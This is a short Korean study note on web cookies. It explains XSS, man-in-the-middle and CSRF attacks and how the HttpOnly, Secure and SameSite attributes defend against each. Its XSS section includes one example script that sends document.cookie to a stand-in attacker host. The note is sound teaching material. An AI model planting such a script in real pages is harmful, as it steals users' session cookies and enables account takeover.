## ✅ **1. 쿠키란?**

**쿠키(Cookie)** 는 **웹 브라우저에 저장되는 작은 데이터 조각**이다.  
서버와 클라이언트(브라우저) 간에 **상태를 유지하거나 사용자 정보를 저장**하는 데 사용된다.

---
## 🧠 **2. 쿠키의 보안 취약점**

### ⚠️ **7.1 XSS (Cross-Site Scripting)**
### ⚠️ **7.2 CSRF (Cross-Site Request Forgery)**
### ⚠️ **7.3 중간자 공격 (MITM)**

---
 ## 🍪**3.HttpOnly Secure 쿠키**
## ⚠️ **3.1 XSS (Cross-Site Scripting) 공격**

- **공격 방법:** 공격자가 웹 페이지에 **악성 JavaScript 코드를 삽입**한다.
- **목적:** JavaScript를 통해 `document.cookie`로 쿠키를 탈취한다.

**예시:**

```javascript
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

- **HttpOnly 쿠키는?**
    - JavaScript로 접근할 수 없기 때문에 `document.cookie`로 가져올 수 없다.

**✅ 결론:** **HttpOnly가 XSS 공격으로부터 안전합니다.**

---

## ⚠️ **3.2 중간자 공격 (Man-in-the-Middle, MITM)**

- **공격 방법:** HTTP로 전송되는 쿠키를 공격자가 가로챈다.
- **Secure 쿠키는?**
    - `Secure` 속성이 설정된 쿠키는 **HTTPS를 통해서만 전송**된다.
    - HTTP로 전송되지 않기 때문에 가로챌 수 없습니다.

**✅ 결론:** **Secure가 MITM 공격으로부터 안전합니다.**

---

## ⚠️ **3.3 CSRF (Cross-Site Request Forgery)**

- **공격 방법:** 사용자가 로그인한 상태에서 악성 웹 사이트가 요청을 자동으로 보낸다.
- **SameSite 쿠키는?**
    - `SameSite=Strict`: 다른 도메인에서는 쿠키를 보내지 않는다.
    - `SameSite=Lax`: 외부 링크 클릭 시만 쿠키 전송.

**✅ 결론:** **SameSite가 CSRF 공격으로부터 안전하다.**

## 🚦 **3.4. HttpOnly Secure 쿠키는 완벽할까?**
1. **물리적 탈취:** 사용자의 디바이스가 탈취되면 쿠키를 열어볼 수 있다.
2. **브라우저 취약점:** 브라우저 보안에 취약점이 있을 경우 노출 가능.
3. **로그아웃 관리:** 서버에서 쿠키를 강제로 무효화할 수 없음.

**→ 이 한계를 보완하기 위해 Redis를 사용하여 Refresh Token을 중앙 관리한다.**

---
![[Pasted image 20241224122701.png]]

AccessToken은 자바스크립트(Vue.js)의 메모리(전역 변수)에 저장